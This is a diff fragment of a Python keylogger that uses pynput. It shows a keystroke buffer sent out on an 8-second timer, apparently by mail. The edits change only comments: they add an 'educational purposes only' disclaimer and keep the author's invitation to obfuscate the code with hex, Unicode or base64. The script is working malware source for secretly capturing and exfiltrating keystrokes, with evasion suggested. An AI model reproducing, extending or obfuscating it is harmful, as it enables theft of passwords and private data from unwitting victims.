@@ -5,7 +5,7 @@ from pynput.keyboard import Key, Listener
 
 # You can try and obfuscate this code.
 # Try using Hex / Unicode / base64 or some strange logic on the program's.
-# Any Ideas?
+# Any Ideas? This is just for educational purposes only, REMEMBER! nothing special.
 
 buffer = ''
 buffer_lock = threading.Lock()
@@ -24,9 +24,10 @@ def send_buffer():
                 m.close()
             except Exception as e:
                 logging.error(f"Exception: {e}")
+                # If any, please report me because it works just fine on my side ...
             buffer = ''  # Clear the buffer after sending
         threading.Timer(8, send_buffer).start()  # Reset the timer to call send_buffer again in 4 seconds
-        # Change the timer as you wish as i only tested it for 8 seconds DELAY.
+        # Change the timer as you wish as I only tested it for 8 seconds DELAY.
 
 def on_press(key):
     global buffer
